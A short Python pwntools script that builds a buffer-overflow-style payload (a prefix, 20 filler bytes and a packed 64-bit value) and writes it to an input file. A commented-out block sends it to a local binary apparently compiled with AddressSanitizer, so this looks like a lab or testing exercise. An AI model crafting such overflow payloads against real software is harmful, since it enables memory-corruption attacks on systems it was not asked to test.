from pwn import*

context(arch="amd64", os="linux")

payload = b'5555' + b'h' * 20 + p64(5555)

'''
process1 = process('./asan_t1')
process1.sendline(payload)
print(process1.recv())
'''

f = open("input1_t1", "wb")
f.write(payload)
f.close()
